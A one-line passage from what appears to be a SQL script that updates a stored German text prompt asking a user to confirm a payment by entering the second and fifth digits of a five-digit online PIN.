...
UPDATE `CustomItem` SET `value` = 'Bitte bestätigen Sie Ihre Zahlung. Geben Sie dazu die 2. und 5. Stelle Ihrer 5-stelligen Online-PIN hintereinander und ohne Kommastellen ein.'
